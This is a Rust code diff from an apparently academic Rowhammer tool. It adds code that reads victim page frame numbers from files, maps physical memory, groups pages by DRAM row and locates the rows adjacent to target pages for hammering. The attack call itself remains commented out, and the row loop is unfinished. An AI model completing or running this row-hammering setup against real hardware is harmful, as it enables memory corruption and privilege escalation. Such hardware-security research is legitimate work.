@@ -1,7 +1,9 @@
 use core::ffi::c_void;
 
 use std::{
-    io::{self, Write},
+    fs::File,
+    io::{self, BufRead, BufReader, Write},
+    path::Path,
     process::{self, Command},
     thread,
     time::Duration,
@@ -14,9 +16,42 @@ use nix::{
 };
 
 use crate::profiler::{
-    pagefinder::PageCandidate,
-    utils::{self, fill_memory, get_block_by_order, rowhammer},
+    pagefinder::{get_candidate_pages, PageCandidate},
+    utils::{
+        self, collect_pages_by_row, fill_memory, get_block_by_order, rowhammer, setup_mapping,
+    },
 };
+
+fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64, u64)), String> {
+    let file = File::open(input_path).expect("Failed to open file.");
+
+    for line in BufReader::new(file).lines() {
+        let line = line.expect("Error when reading line in file.");
+
+        if !line.starts_with(">") {
+            continue;
+        }
+
+        let p = line[1..]
+            .split_whitespace()
+            .take(5)
+            .map(|s| {
+                u64::from_str_radix(
+                    match s.strip_prefix("0x") {
+                        Some(s) => s,
+                        None => s,
+                    },
+                    16,
+                )
+                .expect("Failed to parse hexstring in input file to u64")
+            })
+            .collect::<Vec<_>>();
+
+        return Ok((p[0], (p[1], p[2]), (p[3], p[4])));
+    }
+
+    Err(String::from("Couldnt parse pfns from file"))
+}
 
 fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
     println!("Setting up attack pages:");
@@ -161,16 +196,75 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
     println!("Done with attack");
 }
 
-pub(crate) fn main(fraction_of_phys_memory: f64, testing: bool) {
+pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
+    let row_size = 128 * 1024 * dimms as usize;
+    let mut mmap = setup_mapping(0.0);
+
     let mut hammer = true;
 
     if testing {
         hammer = false;
     }
 
-    //let pagemap = setup_mapping(fraction_of_phys_memory);
+    let mut victim_pfns = Vec::new();
+    victim_pfns.push("0x3b4bf1");
+    victim_pfns.push("0x3dd31e");
+    victim_pfns.push("0x400b3a");
 
-    //rowhammer_attack(hammer, pages);
+    let mut victim_pages = Vec::new();
+
+    for pfn in &victim_pfns {
+        let file = format!("data/V_{}.out", pfn);
+        victim_pages.push(get_page_pfns(file).unwrap());
+    }
+
+    println!("Setting up memory mapping...");
+    let (pagemap, pages_by_row, victims) = loop {
+        std::mem::drop(mmap);
+        mmap = setup_mapping(fraction_of_phys_memory);
+
+        println!("Collecting all pages in all rows...");
+        let pages_by_row = collect_pages_by_row(&mut mmap, row_size).unwrap();
+
+        if pages_by_row.len() < 3 {
+            eprintln!(
+                "[!] Can't hammer rows - only got {} rows total. Make sure you're running as sudo!",
+                pages_by_row.len()
+            );
+
+            ()
+        }
+
+        let victims = get_candidate_pages(&pages_by_row, &victim_pages);
+
+        if victims.len() != victim_pfns.len() {
+            println!("Couldn't find all victim pages in mapping, Remapping!");
+            continue;
+        }
+
+        break (mmap, pages_by_row, victims);
+    };
+
+    println!("Targets: {:#?}", victims);
+    let mut indices = (0..pages_by_row.len() - 2).collect::<Vec<_>>();
+
+    'main: for above_row_index in indices {
+        let target_row_index = above_row_index + 1;
+        let below_row_index = above_row_index + 2;
+
+        let above_row = &pages_by_row[above_row_index];
+        let target_row = &pages_by_row[target_row_index];
+        let below_row = &pages_by_row[below_row_index];
+
+        // If any of the rows are not full we can't hammer them, so continue to the next iteration
+        for i in 0..3 {
+            if pages_by_row[above_row_index + i].len() != row_size as usize / utils::PAGE_SIZE {
+                continue 'main;
+            }
+        }
+    }
+
+    //rowhammer_attack(hammer, victims);
 
     println!("Done with attack");
 }
